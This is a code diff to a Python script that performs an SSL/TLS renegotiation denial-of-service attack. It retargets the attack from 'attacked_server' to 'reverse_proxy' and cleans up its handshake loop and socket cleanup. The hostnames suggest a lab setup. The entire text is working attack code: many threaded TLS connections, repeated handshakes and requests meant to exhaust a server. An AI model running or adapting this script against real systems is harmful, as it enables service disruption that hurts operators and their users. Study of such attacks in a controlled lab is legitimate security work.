@@ -3,8 +3,10 @@ import ssl
 import threading
 import time
 
-target_host = 'attacked_server'
-target_port = 3000
+# target_host = 'attacked_server'
+# target_port = 3000
+target_host = 'reverse_proxy'
+target_port = 3001
 
 # SSL context creation with no certificate verification
 context = ssl.create_default_context()
@@ -16,6 +18,8 @@ renegotiations_per_connection = 10
 interval = 1  # Time in seconds to wait before renegotiating
 
 def renegotiate_ssl_handshake(connection_id):
+    sock = None
+    ssl_sock = None
     try:
         # Create a TCP connection to the target server
         sock = socket.create_connection((target_host, target_port))
@@ -24,22 +28,14 @@ def renegotiate_ssl_handshake(connection_id):
         ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
         
         # Initiate the initial SSL handshake
-        handshake_result = ssl_sock.do_handshake()
-        if handshake_result is None:
-            print(f"Initial handshake completed on connection {connection_id}")
-        else:
-            print(f"Initial handshake failed on connection {connection_id}. Handshake result: {handshake_result}")
-        
+        ssl_sock.do_handshake()
         print(f"Initial handshake completed on connection {connection_id}")
         
         # Loop to continuously renegotiate SSL handshake
         for j in range(renegotiations_per_connection):
             # Renegotiate SSL handshake
-            handshake_result = ssl_sock.do_handshake()
-            if handshake_result is None:
-                print(f"Renegotiation handshake {j+1} completed on connection {connection_id}")
-            else:
-                print(f"Renegotiation handshake {j+1} failed on connection {connection_id}. Handshake result: {handshake_result}")
+            ssl_sock.do_handshake()
+            print(f"Renegotiation handshake {j+1} completed on connection {connection_id}")
             
             # Send partial headers or other data to keep the connection active
             ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: attacked_server\r\n\r\n")
@@ -55,8 +51,10 @@ def renegotiate_ssl_handshake(connection_id):
         print(f"Error on connection {connection_id}: {e}")
 
     finally:
-        ssl_sock.close()
-        sock.close()
+        if ssl_sock:
+            ssl_sock.close()
+        if sock:
+            sock.close()
 
 print("Starting SSL renegotiation attack...")
 
